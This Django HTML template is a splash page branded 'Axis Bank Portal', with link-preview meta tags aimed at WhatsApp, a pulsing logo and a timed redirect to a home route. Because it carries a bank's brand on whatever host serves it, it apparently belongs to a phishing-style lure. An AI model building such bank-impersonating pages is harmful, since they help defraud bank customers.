{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Primary Meta Tags -->
  <title>Axis Bank Portal</title>
  <meta name="title" content="Axis Bank Portal">
  <meta name="description" content="Axis Credit Cards offer secure, convenient services for all your banking needs.">

  <!-- Open Graph / WhatsApp Meta Tags -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://{{ request.get_host }}{{ request.path }}">
  <meta property="og:title" content="Axis Bank Portal">
  <meta property="og:description" content="Axis Credit Cards offer secure, convenient services for all your banking needs.">

  <!-- Static Image Tags for WhatsApp Previews -->
  <meta property="og:image" content="https://{{ request.get_host }}{% static 'alogo.png' %}">
  <meta property="og:image:secure_url" content="https://{{ request.get_host }}{% static 'alogo.png' %}">
  <meta property="og:image:type" content="image/png">
  <meta property="og:image:width" content="300">
  <meta property="og:image:height" content="300">

  <!-- Twitter Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Axis Bank Portal">
  <meta name="twitter:description" content="Axis Credit Cards offer secure, convenient services for all your banking needs.">
  <meta name="twitter:image" content="https://{{ request.get_host }}{% static 'alogo.png' %}">

  <style>
    * { 
      margin: 0; 
      padding: 0; 
      box-sizing: border-box; 
    }
    
    body {
      background: #ffffff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    .splash-logo {
      width: 140px;
      height: 140px;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: pulse 1.8s infinite ease-in-out;
    }

    .splash-logo img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }

    @keyframes pulse {
      0% { transform: scale(0.96); opacity: 0.9; }
      50% { transform: scale(1.04); opacity: 1; }
      100% { transform: scale(0.96); opacity: 0.9; }
    }
  </style>
</head>
<body>

  <div class="splash-logo">
    <img src="{% static 'alogo.png' %}" alt="Axis Bank Logo">
  </div>

<script>
  // Redirect to home page after 3 seconds
  setTimeout(() => {
    window.location.href = "{% url 'home' %}";
  }, 3000);
</script>

</body>
</html>
